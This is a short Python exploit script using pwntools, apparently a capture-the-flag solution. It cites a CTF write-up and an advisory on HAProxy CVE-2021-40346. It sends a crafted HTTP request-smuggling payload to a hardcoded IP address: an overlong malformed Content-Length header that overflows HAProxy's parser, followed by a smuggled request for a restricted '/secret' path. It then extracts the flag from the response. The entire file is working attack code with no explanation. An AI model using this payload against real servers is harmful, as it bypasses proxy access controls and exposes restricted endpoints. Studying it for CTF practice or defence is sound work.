##!/usr/bin/python3
from re import findall

from pwn import *

# https://ctf.zeyu2001.com/2022/securinets-ctf-finals-2022/struggle
# https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/

# don't print logs
context.log_level = "critical"

host = "3.82.106.93"
port = 80

req1 = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length:28\r\n\r\n"
req2 = f"GET /secret HTTP/1.1\r\nDUMMY:GET /abcd HTTP/1.1\r\nHost: {host}\r\n\r\n"


c = connect(host, port)
c.send(req1.encode())

# print(c.recvuntil(b"\r\n"))
c.recvuntil(b"\r\n")
c.send(req2.encode())
c.recv()

flag = findall("FLAG{.*}", c.recv().decode())[0]

print(flag)
